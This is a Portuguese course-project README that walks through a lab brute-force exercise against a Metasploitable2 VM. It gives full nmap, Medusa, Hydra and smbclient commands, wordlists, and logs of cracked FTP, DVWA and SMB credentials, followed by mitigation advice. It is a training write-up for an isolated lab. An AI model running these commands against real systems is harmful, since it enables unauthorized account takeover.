# Projeto-DIO-Ataque-de-For-a-Bruta-com-Medusa-Kali-Metasploitable2-
Projeto DIO — Ataque de Força Bruta com Medusa (Kali + Metasploitable2)
# Projeto DIO — Ataque de Força Bruta com Medusa (Kali + Metasploitable2)

**Resumo**

Este repositório documenta um exercício controlado de auditoria de senhas (força-bruta / password spraying) realizado em ambiente de laboratório usando **Kali Linux** como atacante e **Metasploitable2** (IP: `192.168.11.2`) como alvo. O objetivo é demonstrar técnicas, registrar evidências e propor recomendações de mitigação.

> **Aviso legal:** Todos os testes descritos neste repositório foram executados em **ambiente controlado** (VMs próprias e autorizadas). Não execute ataques contra sistemas sem permissão explícita.

---

## Estrutura do repositório

```
README.md (este arquivo)
/wordlists
  ├─ users.txt
  ├─ passwords-small.txt
  ├─ users-smb.txt
  └─ passwords-spray.txt
/logs
  ├─ medusa-ftp.txt
  ├─ hydra-dvwa.txt
  └─ medusa-smb.txt
/images (opcional)
  └─ screenshots.png
```

---

## Ambiente e pré-requisitos

* VirtualBox com duas VMs: Kali Linux (atacante) e Metasploitable2 (alvo).
* Rede: Host-only (ex.: vboxnet0). IP do alvo: **192.168.11.2**.
* Ferramentas no Kali: `medusa`, `hydra`, `nmap`, `ftp`, `smbclient`.
* Versões utilizadas (exemplo): Medusa v2.3, Hydra v9.5, Nmap 7.95.

---

## Wordlists usadas (tapadas e pequenas para anexar ao repositório)

**/wordlists/users.txt**

```
msfadmin
admin
root
test
ftp
```

**/wordlists/passwords-small.txt**

```
msfadmin
password
123456
admin
ftp
```

**/wordlists/users-smb.txt** (para SMB)

```
msfadmin
admin
root
test
ftp
```

**/wordlists/passwords-spray.txt** (password-spraying — poucas senhas)

```
msfadmin
password
123456
admin
ftp
```

---

## Passo a passo executável (comandos e explicações)

### 1) Recon: Nmap

Varredura de portas importantes e serviços:

```bash
nmap -sC -sV 192.168.11.2
```

Trecho relevante do resultado:

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian
... (outros serviços listados)
```

Exemplo de enumeração de usuários SMB com script do Nmap:

```bash
nmap -p 445 --script smb-enum-users 192.168.11.2
```

Trecho do output (simplificado):

```
| smb-enum-users:
|   METASPLOITABLE\msfadmin (RID: 3000)
|     Full name:   msfadmin,,,
|     Flags:       Normal user account
|   METASPLOITABLE\user (RID: 3002)
|     Full name:   just a user,111,,
|     Flags:       Normal user account
... (vários usuários listados)
```

---

### 2) Ataque FTP com Medusa

Comando executado:

```bash
medusa -h 192.168.11.2 -M ftp -U users.txt -P passwords-small.txt -t 16 -f | tee logs/medusa-ftp.txt
```

Saída registrada (trecho relevante — horário: 2025-10-02 21:20:07):

```
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-10-02 21:20:07 ACCOUNT CHECK: [ftp] Host: 192.168.11.2 (1 of 1, 0 complete) User: msfadmin (1 of 5, 3 complete) Password: msfadmin (1 of 5 complete)
2025-10-02 21:20:07 ACCOUNT FOUND: [ftp] Host: 192.168.11.2 User: msfadmin Password: msfadmin [SUCCESS]
2025-10-02 21:20:09 ACCOUNT CHECK: [ftp] Host: 192.168.11.2 (1 of 1, 0 complete) User: msfadmin (1 of 5, 4 complete) Password: ftp (2 of 5 complete)
... (linhas de checagem de outras combinações)
```

Validação manual via cliente FTP:

```bash
ftp 192.168.11.2
# Quando solicitado:
# Name: msfadmin
# Password: msfadmin
# Resultado: 230 Login successful.
```

Observação: o login `msfadmin:msfadmin` foi confirmado como válido.

---

### 3) Ataque ao formulário web (DVWA) com Hydra

Exemplo de comando Hydra (capturando os campos do formulário e a mensagem de falha `Incorrect`):

```bash
hydra -l admin -P passwords-small.txt 192.168.11.2 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Incorrect" | tee logs/hydra-dvwa.txt
```

Trecho do resultado (horário: 2025-10-02 21:23:00):

```
[80][http-post-form] host: 192.168.11.2   login: admin   password: admin
[80][http-post-form] host: 192.168.11.2   login: admin   password: msfadmin
[80][http-post-form] host: 192.168.11.2   login: admin   password: 123456
[80][http-post-form] host: 192.168.11.2   login: admin   password: ftp
[80][http-post-form] host: 192.168.11.2   login: admin   password: password
1 of 1 target successfully completed, 5 valid passwords found
```

Validação do acesso no navegador:

```
http://192.168.11.2/dvwa/vulnerabilities/brute/?username=admin&password=password&Login=Login#

Login
Username: admin
Password: password

Welcome to the password protected area admin
```

Observação: Vários pares de senha válidos foram identificados para o usuário `admin` (este é um ambiente propositalmente inseguro — DVWA em `LOW`).

---

### 4) Password spraying / SMB com Medusa

Comando exemplo para testar SMB contra uma lista de usuários (spray com poucas senhas):

```bash
medusa -h 192.168.11.2 -M smb -U users-smb.txt -P passwords-spray.txt -t 8 | tee logs/medusa-smb.txt
```

Complementarmente, usamos `smbclient` para validar credenciais quando encontradas:

```bash
smbclient -L //192.168.11.2 -U msfadmin%msfadmin
```

E também a enumeração de usuários via Nmap (mostrada no início) para compor a lista `users-smb.txt`:

```bash
nmap -p 445 --script smb-enum-users 192.168.11.2
```

---

## Evidências e logs

* `logs/medusa-ftp.txt` — saída completa do Medusa contra FTP (inclui a linha `ACCOUNT FOUND: msfadmin:msfadmin`).
* `logs/hydra-dvwa.txt` — saída do Hydra contra DVWA (diversas senhas válidas para `admin`).
* `logs/medusa-smb.txt` — saída do Medusa contra SMB (registros do password-spray).
* `images/` — pasta opcional para screenshots (login FTP bem-sucedido, página DVWA com login, saída do smbclient, etc.).

Inclua screenshots claras que demonstrem: 1) nmap identificando serviços; 2) medusa reporting sucessos; 3) cliente FTP com login bem-sucedido; 4) DVWA mostrando área protegida acessada.

---

## Recomendações de mitigação (por vetor)

**FTP (vsftpd / serviços de FTP em texto claro)**

* Desabilitar FTP em produção; usar SFTP/FTPS.
* Aplicar bloqueio/account lockout após X tentativas falhas.
* Implementar autenticação forte e MFA.
* Monitorar logs e alertar tentativas anômalas.

**Formulários Web (DVWA / login HTTP)**

* Implementar rate-limiting e bloqueio progressivo por IP/conta.
* Usar CAPTCHAs para altas taxas de tentativas automatizadas.
* Garantir hashing forte de senhas (bcrypt/scrypt/argon2) e políticas de senha.
* Usar HTTPS estrito (HSTS) e validação de tokens CSRF.

**SMB / rede interna**

* Segmentar a rede; limitar exposição de SMB a redes necessárias.
* Forçar políticas de senha e expiração; desabilitar contas padrão/íntegras.
* Habilitar monitoramento e detecção de varreduras/ataques de força-bruta.

---

## Como entregar (DIO)

1. Crie um repositório público no GitHub.
2. Suba este `README.md` como arquivo principal.
3. Adicione a pasta `/wordlists` com os arquivos pequenos aqui descritos.
4. Adicione a pasta `/logs` com os arquivos de saída (se desejar). Não suba wordlists muito grandes ou dados sensíveis.
5. (Opcional) inclua `/images` com capturas de tela.
6. Clique em “Entregar Projeto” na DIO e cole o link do repositório com uma breve descrição do que foi entregue.

**Sugestão de descrição curta para a entrega:**

> Projeto DIO — Ataques de força-bruta em ambiente controlado (Kali + Metasploitable2). README com passo-a-passo, wordlists de exemplo, logs de execução e recomendações de mitigação.

---

## Observações finais

* Documente sempre as versões das ferramentas usadas (`medusa -V`, `hydra -v`, `nmap --version`).
* Explique no README que o ambiente DVWA foi deixado em `LOW` para permitir testes educacionais e que, em produção, as recomendações acima devem ser aplicadas.
* Não inclua senhas reais de sistemas de produção no repositório.

---

**Licença / Disclaimer:** Este material é educacional e pode ser compartilhado sob a licença Creative Commons Attribution-NonCommercial (CC BY-NC). Use de forma responsável.
